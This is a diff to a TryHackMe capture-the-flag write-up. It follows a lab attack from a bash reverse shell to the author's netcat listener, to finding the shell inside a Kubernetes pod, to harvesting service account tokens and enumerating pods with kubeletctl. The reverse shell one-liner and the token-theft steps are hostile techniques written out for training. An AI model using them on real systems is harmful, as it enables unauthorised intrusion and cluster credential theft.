@@ -322,6 +322,7 @@ hostname
 ```
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/bbeb1c0c-3a3b-4d65-a90d-7d344cef64fa)
+
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b7bf4de3-7856-4738-b35b-781008aefa80)
 
 Finally I executed the bash reverse shell & got a connection back on my netcat listener:
@@ -332,4 +333,30 @@ bash -c "bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f319a4b6-2e1d-4975-bbb7-24ae87066c6b)
 
-I got the reverse shell as root but doing some manual enumeration I got to know I am inside a docker environment.
+I got the reverse shell as root but doing some manual enumeration it looks like I am inside a virtual environment.
+Further enumeration revealed that I am inside a kubernetes pod:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9375898e-6afd-4fce-972b-d8f81b68a749)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+### User.txt:
+
+To get the user flag & escape the virtual environment I pefromed some manual enumeration for the certificates & token taking reference from [Hacktrickz cloud](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration).
+As per the blog I can find secrets & token in below locations:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/ab97a5e6-1586-4113-a4cf-e31b1170e8f9)
+
+When checked on these location I found the certificate, namespaces & token inside "/var/run/secrets/kubernetes.io/serviceaccount" directory:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/53ecef96-2277-4818-a532-55fbabb7b495)
+
+These certificates & token belongs to "frankland" namespace, which is mentioned inside the namespace file.
+
+I used [Kubeletctl](https://github.com/cyberark/kubeletctl) to check for the pods & namespaces in the target host, this also showed me a POD namespace with "frankland".
+
+```bash
+kubeletctl pods -s 10.10.32.152 --http --port 10255
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/f1bfd298-7300-45b5-acb3-cdca2a965d23)
